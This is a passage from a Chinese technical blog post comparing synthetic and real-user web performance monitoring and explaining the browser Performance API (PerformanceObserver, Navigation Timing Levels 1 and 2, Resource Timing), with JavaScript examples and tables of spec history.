<p>开发中我们可以用市面上较为成熟的合成监控工具进行测量，知名度比较高的应该还属<strong>LightHouse</strong>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fpagespeed.web.dev%2F" target="_blank" title="https://pagespeed.web.dev/" ref="nofollow noopener noreferrer">Google Pagespeed Insights</a>。</p>
<p>假设我们现在想用LightHouse来监测React官网的性能如何，我们可以先本地安装一下LightHouse：</p>
<pre><code class="hljs language-powershell" lang="powershell">npm install -g lighthouse
</code></pre>
<p>这里指定监测网站并将报告输出为HTML文件：</p>
<pre><code class="hljs language-powershell" lang="powershell">lighthouse &lt;https://zh-hans.react.dev/&gt; --output html --output-path ./report.html
</code></pre>
<p>监测结果页差不多长这样：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60940cc6eddc4c7e8dad64eca94a7120~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=ZlEJYnt%2FaMeE18b%2BIJKxNPrRMb0%3D" alt="Clipboard_Screenshot_1765866239.png" loading="lazy"/>
从LightHouse生成的结果来看，React官网看起来不是很“好”，那是否证明React官网真的不够好呢？实际未必。</p>
<p>合成监控是存在局限性的。</p>
<p>不同工具对性能指标的重视程度不同，这意味着不同的工具<strong>监控指标很可能权重不一致，监测方法也会存在一定的差异</strong>。如某些工具侧重页面加载时间，而其他工具可能更关注交互延迟等。另外，工具使用的测试环境、设备性能、网络状况和浏览器版本也有所不同，进一步影响了监测结果的准确性。因此，<strong>同一网站在不同合成监控工具下可能会得出不同的性能评估数据</strong>。</p>
<p>总结来说：</p>
<p>合成监控有一些显而易见的优点：</p>
<ol>
<li>实现简单，解决方案成熟</li>
<li>可以采集到更丰富的数据</li>
<li>不影响真实用户的访问性能</li>
<li>提供多种可视化分析</li>
</ol>
<p>但同时合成监控也仍存一些局限：</p>
<ol>
<li>无法真实还原所有场景，考虑因素较少</li>
<li>登陆等场景需要额外解决（强制登陆页或管理平台页）</li>
<li>单次执行数据不稳定，数据量过小</li>
</ol>
<h3 data-id="heading-7">真实用户监控</h3>
<p>真实用户监控（Real User Monitoring, RUM）是<strong>通过收集实际用户在访问网站或应用时的性能数据来评估性能</strong>。RUM 监控不依赖于模拟用户或脚本，而是直接从用户的设备中获取数据，捕捉他们的交互行为和页面加载时间。</p>
<blockquote>
<p>通常来讲，在看NetWork里面的请求时，有一堆看不懂的字符串一般都是内容上报hh</p>
</blockquote>
<p>下面是一个真实用户监控的流程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa8774f9a94544408eccccead42308b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=y7oMjmensHWDAwcv47a6Yw1VfiU%3D" alt="Clipboard_Screenshot_1765866261.png" loading="lazy"/></p>
<p>真实用户监控看起来very good，毕竟是基于”真实“的数据进行监控，但是真实用户监控也存在一定的局限性，主要体现在数据的代表性和采集的复杂性上。</p>
<p>由于 RUM 是基于实际用户的行为进行监测，因此<strong>不同用户在不同设备、网络环境和地理位置下的体验差异可能导致数据的不一致</strong>。由于用户行为多样性，RUM 无法在短时间内提供全面的性能评估，尤其是在流量较小或访问量较低的情况下，数据可能存在一定的偏差，不足以支撑性能分析的全面性。</p>
<p>总结来说：</p>
<p>真实用户监控有一些nice的点：</p>
<ol>
<li>无需模拟，完全还原真实场景</li>
<li>不存在登陆等需要额外解决的场景</li>
<li>在数据量足够庞大时，分析结果总是好的</li>
</ol>
<p>但是也存在一些bad点：</p>
<ol>
<li>可能会影响真实用户的使用感受</li>
<li>无法采集硬件相关指标</li>
<li>无法采集完整的资源加载瀑布图（现代平台其实很多都可以）</li>
<li>无法可视化展示页面的加载过程（现代平台其实很多也都可以）</li>
</ol>
<h3 data-id="heading-8">如何选择合适的方案</h3>
<ul>
<li><strong>合成监控</strong>更适合在<strong>开发阶段</strong>和<strong>上线前</strong>做性能优化，帮助发现一些潜在的性能瓶颈，并且不依赖真实用户的访问量，适合做定期的监控和预警。</li>
<li><strong>真实用户监控</strong>更适合用来<strong>持续监控</strong>网站或应用的性能，并且可以了解不同用户群体在真实环境下的使用体验，尤其对于<strong>大规模的实时监控</strong>、<strong>跨设备</strong>和<strong>跨网络环境</strong>的表现非常有帮助。</li>
</ul>
<h2 data-id="heading-9">真实用户性能数据的采集方案</h2>
<p>ps：合成监控的知识相对比较单一，常用的工具基本都是开箱即用。结合实际来讲，开发中其实更多是需要我们掌握的事真实用户性能数据的采集和分析，这里和大家分享一下RUM的相关内容:)</p>
<h3 data-id="heading-10">Performance API 介绍</h3>
<p>在JS中，主要进行性能数据采集的API都属于浏览器提供的Web Performance API的范畴，基于用途可以分为以下八类：</p>
<blockquote>
<p>写在前面： 原生的PerformanceAPI固然很好，但是实际业务中使用的时候还要结合实际情况分析。 抛出一个引子：例如你的页面首先展示Loading态，你的业务中并不认为Loading态加载出来时是第一个元素加载的时间（可能以页面业务元素为准），但是默认一些API会认为Loading态就是“理所应当”的第一个元素。 所以说也不要一把梭哈就用PerformanceAPI一条路走到死噢～</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c218bb74a00a4e6b9ddcdadb0b6c76a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=oeoseDXsdjiV6GQksYvul6EnPBw%3D" alt="Clipboard_Screenshot_1765866272.png" loading="lazy"/></p>
<p>这里着重介绍三个重要用途/过程，分别是<code>Performance Data</code>，<code>Navigation Timing</code>和<code>Resource Timing</code> 。</p>
<blockquote>
<p>下文主要是分享用途，用一些常用API来增强对特定内容的理解，有些用途中的API说的可能不完全，感兴趣的话还是自查MDN～</p>
</blockquote>
<h4 data-id="heading-11">Performance Data</h4>
<p><strong>Performance Data</strong>是整个Web性能监控的<strong>基础核心</strong>，它做为其他所有用途的基石，它主要回答三个问题：</p>
<ol>
<li>浏览器有哪些性能可以拿？</li>
<li>怎么拿？怎么监听？</li>
<li>怎么处理这些拿到的东西？</li>
</ol>
<p>在我们知道哪些性能可以拿的时候，我们首先要先知道性能数据从哪里来？</p>
<p>实际上，浏览器内部维护了一个<strong>性能条目队列</strong>，每当页面加载、资源加载、用户交互、开发者打点等事件发生，都会记录对应的性能数据，存储为不同类型的 <code>PerformanceEntry</code> 对象。</p>
<p>这些性能数据通过统一的接口 <code>performance.getEntries()</code> 或 <code>PerformanceObserver</code> 提供给开发者。</p>
<p>每个<strong>性能数据条目</strong>都属于某种“类型”，这些类型表示它是关于什么的性能数据。</p>























































<table><thead><tr><th>类型（<code>entryType</code>）</th><th>描述</th><th>举例</th></tr></thead><tbody><tr><td><code>"navigation"</code></td><td>页面整体加载的性能数据</td><td>首次加载页面的流程</td></tr><tr><td><code>"resource"</code></td><td>页面上资源加载的性能数据</td><td>加载图片的耗时</td></tr><tr><td><code>"paint"</code></td><td>首次绘制相关指标</td><td>FP、FCP等</td></tr><tr><td><code>"mark"</code></td><td>自定义的起始时间点</td><td><code>performance.mark('start')</code></td></tr><tr><td><code>"measure"</code></td><td>自定义的耗时段</td><td><code>performance.measure('duration', 'start', 'end')</code></td></tr><tr><td><code>"longtask"</code></td><td>超过 50ms 的长任务</td><td>主线程卡顿情况</td></tr><tr><td><code>"largest-contentful-paint"</code></td><td>最大内容绘制时间</td><td>LCP</td></tr><tr><td><code>"first-input"</code></td><td>首次交互的响应延迟</td><td>FID</td></tr><tr><td><code>"layout-shift"</code></td><td>页面布局变化</td><td>CLS</td></tr></tbody></table>
<blockquote>
<p>可以通过<code>performance.getEntriesByType("xxx")</code>获取对应的数据，在控制台试一试！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d08a10504744e10b958efcbac5555ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=iecnJvT0uTFhLxpiRV4%2Fbrsi4pE%3D" alt="Clipboard_Screenshot_1765866301.png" loading="lazy"/></p>
</blockquote>
<p>上面我们所说的获取<strong>性能资源条目</strong>实际上并不够灵活，如果你希望实时监听性能事件（比较经典的是LCP、资源加载等），使用<code>PerformanceObservers</code>是最佳方式。</p>
<p>例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"实时观察到的性能数据："</span>, entry);
  });
});

observer.<span class="hljs-title function_">observe</span>({
	<span class="hljs-comment">// 设定监听的资源条目</span>
  <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">"paint"</span>, <span class="hljs-string">"resource"</span>, <span class="hljs-string">"mark"</span>, <span class="hljs-string">"measure"</span>]
});
</code></pre>
<p>在现代性能监控中，<code>PerformanceObserver</code>早已成为构建RUM的系统的核心组件了。</p>
<p>到这里我们已经“替”<code>Performance Data</code>回答了两个问题了，第三个问题详见后续：分析性能数据及影响因素。</p>
<p>Performance Data 这一部分，主要<strong>就是表述如何从浏览器性能引擎中提取各种“关键时刻”的数据，并将其用于性能分析、优化与监控</strong>。</p>
<h4 data-id="heading-12">Navigation Timing</h4>
<p><strong>Navigation Timing 主要关注整个页面的导航过程</strong>，对于单个资源（例如图片、脚本等）的加载时间没有详细的度量。</p>
<p>下面是2012年W3C发布的第一版的Navigation Timing的处理模型：</p>
<p>详情见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fnavigation-timing%2F" target="_blank" title="https://www.w3.org/TR/navigation-timing/" ref="nofollow noopener noreferrer">W3C Navigation Timing Level 1</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/751b4c94f50044dd9f9a9b852150c5ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=snuqf3tMikeP6YmBR8XC6%2FdIP9w%3D" alt="Clipboard_Screenshot_1765866326.png" loading="lazy"/></p>
<p>Level 1 提供了统一的 API，<strong>允许开发者在不同浏览器和平台上以一致的方式获取页面加载的关键时间点</strong>，方便性能分析和比较。</p>
<p>它涵盖了从重定向、DNS 查询、TCP 连接、请求发送、响应接收，到 DOM 解析和加载事件等多个阶段，帮助开发者定位性能瓶颈。</p>
<p>Level 1的核心接口是<code>PerformanceTiming</code>和<code>PerformanceNavigation</code> ，分别通过<code>performance.timing</code> 和<code>performance.navigation</code> 来访问。</p>
<p>Level 1 的优点非常明显：</p>
<ol>
<li>
<p>高标准的API</p>
<p>将页面导航的各类时间信息内容进行集成</p>
</li>
<li>
<p>细粒度的时间点</p>
</li>
<li>
<p>促使开发人员进行性能优化</p>
<p>页面数据摆在你的面前，迫使你对耗时处进行修改优化</p>
</li>
</ol>
<p>虽然 Level 1 在很多方面已经做的足够好了，但是仍然存在一定的局限性：</p>
<ol>
<li>
<p>数据粒度有限</p>
<p>虽然时间点比较多，但是对于更加更加细粒度的资源加载和用户交互性能指标支持仍然有限，在应用越来越复杂的场景下无法满足性能分析需求</p>
</li>
<li>
<p>需要使用多API处理同一个逻辑</p>
</li>
<li>
<p>隐私和安全限制</p>
<p>出于安全和隐私考虑，某些时间点在跨域请求中可能不可用，导致数据不完整。</p>
</li>
</ol>
<p>不得不承认，Level 1 是网页性能测量领域的重要里程碑，它为开发者提供了基础且标准化的导航时间数据，极大地推动了前端性能优化的发展。但随着需求的提升和技术的进步，Level 1 的功能已显不足，它无法处理多种场景下的复杂情况，使用它的同时<strong>通常要结合其他性能API一起使用</strong>，这样才可以获得更全面和精细的性能分析能力。</p>
<blockquote>
<p>所谓长江后浪推前浪 一浪更比一浪强～ Navigation Timing Level 2 应运而生</p>
</blockquote>
<p>下面是W3C第二版的Navigation Timing的处理模型：</p>
<p>详情见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fnavigation-timing-2%2F" target="_blank" title="https://www.w3.org/TR/navigation-timing-2/" ref="nofollow noopener noreferrer">W3C Navigation Timing Level 2</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d809a2a08a7e4d1780304781aedbe7af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=Op2qQWdNxLtPnOnOPZFSCejmBF0%3D" alt="Clipboard_Screenshot_1765866342.png" loading="lazy"/></p>
<p>Level 2 是对 Level 1 的扩展和改进。</p>
<p>从图中不难看出，Level 2 相较于 Level 1 有更多的时间节点、更灵活的接口设计、更丰富的测量指标、更强大的跨域资源的处理、更权威的配色、更兢兢业业的提出人员…</p>
<p>针对 Level 1 的局限性，Level 2 做了一些优化：</p>








































<table><thead><tr><th><strong>Level 1 的局限性</strong></th><th><strong>Level 1 的局限性细则</strong></th><th><strong>Level 2 的优化</strong></th></tr></thead><tbody><tr><td><strong>数据粒度有限</strong></td><td>时间点多，但缺乏对资源级别和用户交互的详细度量。</td><td/></tr><tr><td>时间精度<strong>以毫秒为单位。</strong></td><td><strong>时间点更为丰富（<strong>继承了<code>Resource Timing</code></strong>），方便结合现代网页进行更全面的剖析。</strong></td><td/></tr><tr><td>时间精度<strong>以微秒为单位。</strong></td><td/><td/></tr><tr><td>需要使用多API处理同一个逻辑</td><td>需要使用<code>PerformanceTiming</code> 和<code>PerformanceNavigation</code></td><td><strong>将所有导航相关指标整合为单一对象</strong>。只需使用<code>PerformanceNavigationTiming</code>即可</td></tr><tr><td><strong>隐私和安全限制</strong></td><td>跨域请求中某些时间点不可用，可能导致数据不完整</td><td><strong>增强了对跨域资源的性能数据暴露支持，<strong>在保障隐私的同时</strong>提供了更精细的资源数据监控</strong>，减少数据泄露的风险。</td></tr><tr><td/><td/><td>支持 <code>PerformanceObserver</code> 监听</td></tr></tbody></table>
<p>Level 1 的时间精度是以毫秒为单位，基于<code>Date.now()</code>，如果修改系统时间，<code>Date.now()</code>会跟着变化；Level 2 是名副其实的高精度（High Resolution Time, HRTime）时间，所有时间戳基于<code>performance.timeOrigin</code> ，以微秒精度为准，<strong>不会随着系统时间的修改而变化的</strong>。</p>
<blockquote>
<p>由于只包含当前文档，因此通常只有一个 <code>PerformanceNavigationTiming</code> 对象可供观察。它扩展了 <code>PerformanceEntry</code> 接口，<code>entryType</code> 为 <code>"navigation"</code> ，并且继承自<code>PerformanceEntry</code>和<code>PerformanceResourceTiming</code>，因此获取文档过程中可以使用指定<strong>性能资源条目</strong>的方式，所有时间戳也都可用。</p>
</blockquote>
<p>我们可以通过一个小例子来直观看出二者从使用角度上的区别：</p>
<p>现在提一个最最最ez的需求：监听浏览器的<code>load</code>事件，计算并打印页面的加载时间。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// Level 1</span>
	<span class="hljs-keyword">const</span> timing = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">timing</span>;
	<span class="hljs-keyword">const</span> loadTime = timing.<span class="hljs-property">loadEventEnd</span> - timing.<span class="hljs-property">navigationStart</span>;
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Level 1 页面的加载时间为：'</span>, loadTime, <span class="hljs-string">'ms'</span>);

  <span class="hljs-comment">// Level 2</span>
  <span class="hljs-keyword">const</span> navEntries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>);
  <span class="hljs-keyword">if</span> (navEntries.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
	  <span class="hljs-keyword">const</span> navTiming = navEntries[navEntries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
	  <span class="hljs-keyword">const</span> loadTime2 = navTiming.<span class="hljs-property">loadEventEnd</span> - navTiming.<span class="hljs-property">startTime</span>;
	  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Level 2 页面的加载时间为：'</span>, loadTime2, <span class="hljs-string">'ms'</span>);
	}
});
</code></pre>
<blockquote>
<p>这里有一个需要区分的点，即使Level 2 采用了更高的时间精度，最终输出结果也仍然转换为毫秒。<strong>因为浏览器内部的性能时间戳通常都使用毫秒级别</strong>。</p>
</blockquote>
<p>两段代码实现的功能是一致的，随便找一个网页的控制台进行测试：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecae00cc19a846ec8cfdac24593f2872~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=5bYf55zNjWrYCWyOylGbtfXlbkw%3D" alt="Clipboard_Screenshot_1765866361.png" loading="lazy"/></p>
<p>可以很直观地看到，Level 2 的加载时间的精度更加Good。</p>
<p>稍微复杂一点点，Level 1 就无法”只“使用<code>PerformanceTiming</code>独自胜任。</p>
<p>假设你想<strong>获取页面加载的详细时间</strong>，并且需要知道<strong>页面是否是从缓存加载的</strong>，以此来优化性能。</p>
<p>在Level1中你需要将<code>PerformanceTiming</code>和<code>PerformanceNavigation</code>结合来使用：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
	<span class="hljs-comment">// PerformanceTiming</span>
	<span class="hljs-keyword">const</span> timing = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">timing</span>;
	<span class="hljs-keyword">const</span> loadTime = timing.<span class="hljs-property">loadEventEnd</span> - timing.<span class="hljs-property">navigationStart</span>;
	
	<span class="hljs-comment">// PerformanceNavigation</span>
	<span class="hljs-keyword">const</span> navigation = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">navigation</span>;
	<span class="hljs-keyword">const</span> isFromCache = navigation.<span class="hljs-property">type</span> === <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">navigation</span>.<span class="hljs-property">TYPE_BACK</span>;
	
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面的加载时间为: <span class="hljs-subst">${loadTime}</span>ms`</span>);
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面是否从缓存加载: <span class="hljs-subst">${isFromCache ? <span class="hljs-string">'是'</span> : <span class="hljs-string">'否'</span>}</span>`</span>);
});
</code></pre>
<p>在Level2中你只需使用<code>PerformanceNavigationTiming</code>即可：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
	<span class="hljs-comment">// PerformanceNavigationTiming</span>
	<span class="hljs-keyword">const</span> navigationTiming = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>)[<span class="hljs-number">0</span>];
	<span class="hljs-keyword">const</span> loadTime = navigationTiming.<span class="hljs-property">loadEventEnd</span> - navigationTiming.<span class="hljs-property">navigationStart</span>;
	<span class="hljs-keyword">const</span> isFromCache = navigationTiming.<span class="hljs-property">type</span> === <span class="hljs-string">'back_forward'</span>;
	
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面的加载时间为: <span class="hljs-subst">${loadTime}</span>ms`</span>);
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面是否从缓存加载: <span class="hljs-subst">${isFromCache ? <span class="hljs-string">'是'</span> : <span class="hljs-string">'否'</span>}</span>`</span>);
});
</code></pre>
<p>很明显本着减少代码复杂的角度，Level2更胜一筹。</p>
<p>再稍微复杂一点点：假设我们需要<strong>实时监听用户每次页面导航的性能数据</strong>，<strong>收集微秒级别高精度的加载指标</strong>，并<strong>能区分导航类型</strong>（首次打开、刷新、返回等）。传统 Level 1 只能在页面加载完成后获取一次静态数据，且时间精度较低，无法满足在线监控要求。</p>
<p>在Level2中，我们可以结合<code>PerformanceObserver</code>来使用：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> navObserver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> entries = list.<span class="hljs-title function_">getEntries</span>();
  entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'navigation'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'导航类型:'</span>, entry.<span class="hljs-property">type</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'重定向次数:'</span>, entry.<span class="hljs-property">redirectCount</span>);

      <span class="hljs-comment">// 精确微秒级时间戳</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetch Start:'</span>, entry.<span class="hljs-property">fetchStart</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM Interactive:'</span>, entry.<span class="hljs-property">domInteractive</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Load Event End:'</span>, entry.<span class="hljs-property">loadEventEnd</span>);
      <span class="hljs-comment">//...</span>

      <span class="hljs-comment">// 关键指标计算</span>
      <span class="hljs-keyword">const</span> backendTime = entry.<span class="hljs-property">responseStart</span> - entry.<span class="hljs-property">requestStart</span>;
      <span class="hljs-keyword">const</span> frontendTime = entry.<span class="hljs-property">loadEventEnd</span> - entry.<span class="hljs-property">domInteractive</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器响应时间: <span class="hljs-subst">${backendTime.toFixed(<span class="hljs-number">3</span>)}</span> ms`</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`前端处理时间: <span class="hljs-subst">${frontendTime.toFixed(<span class="hljs-number">3</span>)}</span> ms`</span>);

      <span class="hljs-comment">// 后续处理...</span>
    }
  });
});

<span class="hljs-comment">// 开始监听and确保捕获页面加载前的记录</span>
navObserver.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'navigation'</span>], <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
</code></pre>
<p>不得否认，虽然 Level 1 官方已经不建议使用了，但是我相信很多项目还是使用的 Level 1 提供的<code>performance.timing</code> ，主要就是两点：</p>
<ol>
<li>
<p>兼容性强</p>
<p>毕竟H5时代就存在，所有主流浏览器都支持</p>
</li>
<li>
<p>简单场景下 Level 1 足够用了</p>
<p>虽然<strong>精度低</strong>并且无法通过<code>PerformanceObserver</code>实时监听，但是已存的字段可以满足大部分需求，并且不是所有场景都对“精度”和“实时”要求太高</p>
</li>
</ol>
<p>所以说，即使 Navigation Timing Level 2 提供了更精细、统一的性能条目系统，Level 1 仍在许多项目中“顽强地存活”着，特别是在需要广泛兼容性和低维护成本的场景下。</p>
<p>但是这影响你了解并熟知 Level 2 嘛？我觉得不。很多知识都面临这个问题，我始终觉得跟进稍微“新”一些的东西并无坏处，至少我们能从“新”的东西中知道“老”的东西哪里有一些不好的地方，也可以知道所谓“新”东西有什么好的地方，这本来就是一个仁者见仁智者见智的问题。</p>
<h4 data-id="heading-13">Resource Timing</h4>
<p><strong>Resource Timing</strong> 同样也是性能分析中非常重要的一部分，它允许开发者详细了解页面中<strong>各类资源</strong>（如图片、脚本等）的加载性能。它的核心接口是 <code>PerformanceResourceTiming</code>，通过 <code>window.performance.getEntriesByType('resource')</code> 获取。</p>
<p>详情见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fw3c.github.io%2Fresource-timing%2F%23attribute-descriptions" target="_blank" title="https://w3c.github.io/resource-timing/#attribute-descriptions" ref="nofollow noopener noreferrer">Resource Timing</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/866ec862b0224e5c9c6a050ffc7fbf48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=JFA7Y9GOUy%2BFFv%2Fob03ptisz6v4%3D" alt="Clipboard_Screenshot_1765866378.png" loading="lazy"/></p>
<p>它提供了详细的资源加载性能数据，如图所示。这使得开发者能够识别出哪些资源加载较慢，进而采取针对性的优化措施。<strong>与 Navigation Timing 相比，Resource Timing 能够捕获页面上每个资源的加载性能，而不仅仅是页面本身</strong>。</p>
<p>可以使用：</p>
<pre><code class="hljs language-ini" lang="ini">// 获取所有资源的性能条目
const <span class="hljs-attr">resources</span> = performance.getEntriesByType(<span class="hljs-string">'resource'</span>)<span class="hljs-comment">;</span>
console.log(resources)<span class="hljs-comment">;</span>
</code></pre>
<p>打到控制台中就是这样的效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12e9860313534b8dba2a4b2d749858cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=eLlCnKH4o26JYN8fx9MhGyu%2BpuE%3D" alt="Clipboard_Screenshot_1765866389.png" loading="lazy"/></p>
<p>这样就可以非常简易的获取到各类资源的加载信息，以便后续的上报/分析。</p>
<h4 data-id="heading-14">简化版时间线与标准发展简图</h4>
<p>Performance API本身的API规范和对象类型/接口的名字看起来比较“混乱”，这里做一个简化版的时间线与标准发展简图供理解参考（上文提到的一些已加粗处理）：</p>





































<table><thead><tr><th>规范名称</th><th>描述</th></tr></thead><tbody><tr><td><strong>Navigation Timing Level 1（2012）</strong></td><td>提供 <code>performance.timing</code> 等时间戳字段，核心关注<strong>页面加载流程</strong></td></tr><tr><td>High Resolution Time Level 1（2012）</td><td>引入 <code>performance.now()</code> 精准时间</td></tr><tr><td><strong>Performance Timeline Level 1（2012）</strong></td><td>定义 <code>PerformanceEntry</code> 接口，最早引入 <code>performance.getEntries()</code></td></tr><tr><td><strong>Resource Timing Level 1（2013）</strong></td><td>使用 <code>performance.getEntriesByType('resource')</code> 获取资源加载性能</td></tr><tr><td>User Timing Level 1（2012）</td><td>引入 <code>mark()</code> 和 <code>measure()</code> 并将它们作为 <code>PerformanceEntry</code> 出现在 <code>getEntries()</code> 中</td></tr><tr><td><strong>Navigation Timing Level 2（2017）</strong></td><td>使用 <code>PerformanceNavigationTiming</code> 替代老的 <code>performance.timing</code>，统一纳入 Timeline</td></tr><tr><td><strong>Performance Timeline Level 2+</strong></td><td>支持 <code>PerformanceObserver</code>、buffered 监听等</td></tr></tbody></table>
<p>再来一个名字很像但是并非一样的：</p>



































<table><thead><tr><th/><th>PerformanceTiming</th><th>PerformanceTimeline</th></tr></thead><tbody><tr><td>定义</td><td>一个对象类型/接口</td><td>一个API标准体系/规范</td></tr><tr><td>用途</td><td>页面加载时间戳</td><td>各类性能条目管理</td></tr><tr><td>范围</td><td>仅限页面加载</td><td>包括资源加载、绘制、自定义打点、CLS、LCP 等</td></tr><tr><td>API</td><td><code>performance.timing</code></td><td><code>getEntries()</code>、<code>PerformanceObserver</code></td></tr><tr><td>status</td><td>已存在但<strong>逐步废弃中</strong></td><td>当前性能 API 的核心基础</td></tr></tbody></table>
<h3 data-id="heading-15">页面性能监控的常见指标</h3>
<p>页面性能监控的常见指标用于衡量和优化用户在访问网站或应用时的体验。通过这些指标，开发者可以了解到页面加载过程中的瓶颈，并针对性地进行优化，从而<strong>提高页面的响应速度和稳定性</strong>。</p>
<p>相信前端的朋友们多多少少都知道一些（不，我信你一定知道一些）常见指标，关于页面性能监控的指标大致分为四类：<strong>加载性能</strong>、<strong>交互性能</strong>、<strong>渲染性能</strong>和<strong>网络性能</strong>：</p>
